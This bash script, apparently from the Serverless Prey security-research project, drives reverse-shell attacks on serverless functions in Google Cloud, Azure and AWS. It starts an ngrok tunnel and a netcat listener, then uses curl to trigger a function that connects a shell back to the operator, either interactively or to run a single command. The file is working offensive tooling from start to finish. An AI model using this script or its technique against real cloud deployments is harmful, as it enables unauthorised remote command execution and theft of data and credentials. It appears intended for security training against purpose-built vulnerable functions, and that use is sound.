#!/bin/bash

echo "
  @@@@@@@@((.                                                        ((@@@@@@@@
   *@@@@@@(/*#@%,                                               %&@(*/(@@@@@@/
     (@@@@@(*.#%&@*/(                                       //*@&%#.*(@@@@@(
       /@@@@@(***//(&&&%.                               .%&&&(//***(@@@@@%
          #&@@@@@@&&&&&&&&&                           %&&&&&&&&@@@@@@&#

                                 Serverless Prey
                 https://github.com/pumasecurity/serverless-prey
"

# Enable job control.
set -m

TMP_SUBDIR="/tmp/$(uuidgen)"
mkdir "$TMP_SUBDIR"

cleanup () {
    rm -r "$TMP_SUBDIR"
    kill $(jobs -p) 2>/dev/null;
}

# Kill all subprocesses and clean up files on exit.
trap 'cleanup' EXIT

MODE=$1
shift

# Read named arguments (https://stackoverflow.com/a/14203146)
while [[ "$#" -gt 0 ]]
do
    key="$1"

    case $key in
        -u|--url-id)
        URL_ID="$2"
        shift 2
        ;;

        -a|--api-key)
        API_KEY="$2"
        shift 2
        ;;

        -p|--port)
        LISTENER_PORT="$2"
        shift 2
        ;;

        -r|--region)
        REGION="$2"
        shift 2
        ;;

        -c|--command)
        COMMAND="$2"
        shift 2
        ;;

        -l|--loop)
        LOOP="$2"
        shift 2
        ;;

        -*|--*=) # unsupported flags
        echo "Error: Unsupported flag $1" >&2
        exit 1
        ;;

        *)
        shift
        ;;
    esac
done

LISTENER_PORT="${LISTENER_PORT:-4444}"

if [[ -z "$URL_ID" ]]
then
    echo 'usage: cheetah/cougar/panther [--url-id/-u PROJECT_ID/URL_ID] [--api-key/-a API_KEY] [--region/-r REGION_OVERRIDE] [--port/-p LISTENER_PORT_DEFAULT_4444] [--command/-c SINGLE_COMMAND_TO_RUN_ON_CONNECT] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]'
    echo 'See script/USAGE.md for more details.'
    exit 1
fi

# Run ngrok and derive the public-facing host and port it is using.
ngrok tcp "$LISTENER_PORT" --log stdout > "$TMP_SUBDIR/ngrok_output.txt" 2>&1 &
sleep 3

if ! [[ -n $(pgrep ngrok) ]]
then
    echo "Error: ngrok failed to start properly."
    exit 1
fi

NGROK_HOST_AND_PORT=$(cat "$TMP_SUBDIR/ngrok_output.txt" | grep url | awk '{print $8}' | awk 'BEGIN { FS="url=tcp://" }; { print $2 }')
NGROK_HOST=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $1 }')
NGROK_PORT=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $2 }')

if [[ -z $NGROK_HOST || -z $NGROK_PORT ]]
then
    echo "Error: Failed to get host or port from ngrok."
    exit 1
fi

case $MODE in
    cheetah)
    REGION="${REGION:-us-central1}"
    URL="https://$REGION-$URL_ID.cloudfunctions.net/Cheetah?host=$NGROK_HOST&port=$NGROK_PORT"
    ;;

    cougar)
    URL="https://$URL_ID.azurewebsites.net/api/Cougar?host=$NGROK_HOST&port=$NGROK_PORT&code=$API_KEY"
    ;;

    panther)
    REGION="${REGION:-us-east-1}"
    URL="https://$URL_ID.execute-api.$REGION.amazonaws.com/dev/api/Panther?host=$NGROK_HOST&port=$NGROK_PORT"
    ;;
esac

JOB=2

while ! [[ -z "$LOOP" ]] || [[ $JOB -eq 2 ]]
do
    if [[ -z "$COMMAND" ]]
    then
        nc -l "$LISTENER_PORT" &
    else
        mkfifo "$TMP_SUBDIR/fifo"
        tail -f "$TMP_SUBDIR/fifo" | nc -l "$LISTENER_PORT" > "$TMP_SUBDIR/command_output.txt" &
    fi

    # Invoke the function with an HTTP call, connecting the reverse shell to the Netcat listener.
    curl -s "$URL" -H "X-API-Key: $API_KEY" > "$TMP_SUBDIR/curl_output.txt" &

    # Note: This might be an insufficient amount of time to wait for functions with cold starts.
    # TODO: Investigate better error checking methods.
    sleep 1

    # Exit if the curl request terminated already.
    if [[ -s "$TMP_SUBDIR/curl_output.txt" ]]
    then
        printf "Error: "
        cat "$TMP_SUBDIR/curl_output.txt"
        exit 1
    fi

    # Exit if the curl command failed altogether.
    if ! [[ -n $(pgrep curl) ]]
    then
        echo "Error: curl command failed."
        exit 1
    fi

    if [[ -z "$COMMAND" ]]
    then
        # Bring the Netcat listener back to the foreground.
        printf '> '
        fg $JOB > /dev/null

        # Break out of the loop on CTRL-C.
        test $? -gt 128 && break
    else
        # Execute a single command and exit.
        echo "$COMMAND" > "$TMP_SUBDIR/fifo"
        sleep 1
        cat "$TMP_SUBDIR/command_output.txt"
        break
    fi

    echo
    echo 'Connection terminated.'
    JOB=$(($JOB + 2))

    if ! [[ -z "$LOOP" ]]
    then
        rm "$TMP_SUBDIR/curl_output.txt"
        echo 'Restarting...'
    fi
done
